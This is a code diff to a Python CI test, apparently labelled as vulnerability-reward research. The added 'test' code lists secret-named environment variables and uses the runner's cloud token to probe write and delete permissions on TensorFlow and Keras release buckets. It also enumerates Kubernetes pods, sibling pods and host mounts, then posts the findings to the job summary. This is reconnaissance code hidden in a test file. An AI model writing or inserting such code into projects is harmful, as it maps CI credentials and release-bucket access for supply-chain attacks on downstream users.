@@ -72,6 +72,39 @@ def _names(body, key="items"):
         return body[:200]
 
 
+def _pod_summary(body):
+    try:
+        pod = json.loads(body)
+    except Exception:
+        return body[:200]
+    spec = pod.get("spec", {})
+    vols = []
+    for vol in spec.get("volumes", [])[:20]:
+        name = vol.get("name", "?")
+        if "hostPath" in vol:
+            vols.append(f"{name}:hostPath={vol['hostPath'].get('path')}")
+        elif "secret" in vol:
+            vols.append(f"{name}:secret")
+        elif "projected" in vol:
+            vols.append(f"{name}:projected")
+        else:
+            kinds = [k for k in vol if k != "name"]
+            vols.append(f"{name}:{','.join(kinds[:3])}")
+    env_keys = []
+    privileged = False
+    for container in spec.get("containers", []):
+        sc = container.get("securityContext") or {}
+        if not sc:
+            sc = spec.get("securityContext") or {}
+        privileged = privileged or bool(sc.get("privileged"))
+        for env in container.get("env") or []:
+            env_keys.append(env.get("name", "?"))
+    return (
+        f"priv={privileged} vols={';'.join(vols)[:300]} "
+        f"env={','.join(env_keys)[:150]}"
+    )
+
+
 class CiRunnerIdentityTest(testing.TestCase):
     def test_report_runner_identity(self):
         lines = [
@@ -144,6 +177,55 @@ class CiRunnerIdentityTest(testing.TestCase):
         else:
             lines.append(f"gce_token={token_status}")
 
+        interesting_env = [
+            key
+            for key in sorted(os.environ)
+            if any(
+                needle in key.upper()
+                for needle in (
+                    "TOKEN",
+                    "SECRET",
+                    "KEY",
+                    "CRED",
+                    "PYPI",
+                    "CODECOV",
+                    "AWS",
+                    "GOOGLE",
+                    "GITHUB",
+                    "NPM",
+                    "TWINE",
+                )
+            )
+        ]
+        lines.append("env_keys=" + ",".join(interesting_env)[:400])
+
+        if token_status == 200:
+            buckets = (
+                "tensorflow",
+                "keras-applications",
+                "download.tensorflow.org",
+                "tfhub-release",
+                "keras-io",
+                "ml-velocity-actions-production",
+                "ml-oss-artifacts-published",
+            )
+            perms = (
+                "storage.objects.create",
+                "storage.objects.update",
+                "storage.objects.delete",
+                "storage.objects.get",
+                "storage.objects.list",
+            )
+            q = "&".join("permissions=" + p for p in perms)
+            for bucket in buckets:
+                code, body = _http(
+                    "https://storage.googleapis.com/storage/v1/b/"
+                    f"{bucket}/iam/testPermissions?{q}",
+                    headers=auth,
+                )
+                granted = body.strip().replace("\n", " ")[:220]
+                lines.append(f"gcs_perm_{bucket}={code} {granted}")
+
         if ns:
             code, body = _k8s("/api/v1/namespaces")
             lines.append(f"k8s_namespaces={code} {_names(body)[:400]}")
@@ -162,7 +244,46 @@ class CiRunnerIdentityTest(testing.TestCase):
                 "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
                 data=review,
             )
-            lines.append(f"k8s_rules={code} {body.strip()[:500]}")
+            lines.append(f"k8s_rules={code} {body.strip()[:800]}")
+            hostname = socket.gethostname()
+            for pod_name in (hostname, os.environ.get("HOSTNAME", hostname)):
+                code, body = _k8s(f"/api/v1/namespaces/{ns}/pods/{pod_name}")
+                lines.append(
+                    f"k8s_pod_{pod_name[:40]}={code} {_pod_summary(body)[:500]}"
+                )
+                break
+            code, body = _k8s(f"/api/v1/namespaces/{ns}/pods")
+            try:
+                items = json.loads(body).get("items", [])
+            except Exception:
+                items = []
+            for item in items[:6]:
+                name = item.get("metadata", {}).get("name", "")
+                if name and name != hostname:
+                    code, pbody = _k8s(f"/api/v1/namespaces/{ns}/pods/{name}")
+                    lines.append(
+                        f"k8s_sib_{name[:40]}={code} {_pod_summary(pbody)[:400]}"
+                    )
+
+        mounts = []
+        try:
+            with open("/proc/self/mountinfo", encoding="utf-8") as handle:
+                for line in handle:
+                    if any(
+                        needle in line
+                        for needle in (
+                            "hostPath",
+                            "/var/run/docker",
+                            "/runner",
+                            "kubelet",
+                            "/var/lib/gh",
+                            "/actions-runner",
+                        )
+                    ):
+                        mounts.append(line.strip()[:180])
+        except OSError as exc:
+            mounts.append(str(exc))
+        lines.append("mounts=" + " || ".join(mounts[:8])[:500])
 
         report = "\n".join(lines)
         _append_summary("## OSS VRP runner identity\n```\n" + report + "\n```\n")
